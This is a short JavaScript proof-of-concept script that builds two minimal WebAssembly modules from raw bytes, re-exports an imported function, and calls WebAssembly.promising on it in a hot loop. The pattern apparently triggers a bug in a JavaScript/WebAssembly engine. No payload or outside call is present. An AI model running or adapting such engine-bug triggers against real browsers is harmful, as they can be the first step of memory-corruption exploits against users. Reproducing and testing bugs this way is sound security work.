const provider_wasm = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x05, 0x01,
    0x60, 0x00, 0x01, 0x7f, 0x03, 0x02, 0x01, 0x00, 0x07, 0x07, 0x01,
    0x03, 0x65, 0x78, 0x70, 0x00, 0x00, 0x0a, 0x06, 0x01, 0x04, 0x00,
    0x41, 0x2a, 0x0b
]);

const consumer_wasm = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x05, 0x01,
    0x60, 0x00, 0x01, 0x7f, 0x02, 0x0b, 0x01, 0x03, 0x65, 0x6e, 0x76,
    0x03, 0x69, 0x6d, 0x70, 0x00, 0x00, 0x07, 0x0a, 0x01, 0x06, 0x72,
    0x65, 0x5f, 0x65, 0x78, 0x70, 0x00, 0x00
]);

async function poc() {
    const provider_module = await WebAssembly.compile(provider_wasm);
    const consumer_module = await WebAssembly.compile(consumer_wasm);

    const provider_instance = new WebAssembly.Instance(provider_module);
    const re_exported_func = (new WebAssembly.Instance(consumer_module, {
        env: { imp: provider_instance.exports.exp }
    })).exports.re_exp;

    function hot_func(f) {
        const promising_wrapper = WebAssembly.promising(f);
        promising_wrapper();
    }

    for (let i = 0; i < 100; ++i) {
        hot_func(re_exported_func);
    }

    hot_func(re_exported_func);
}

poc();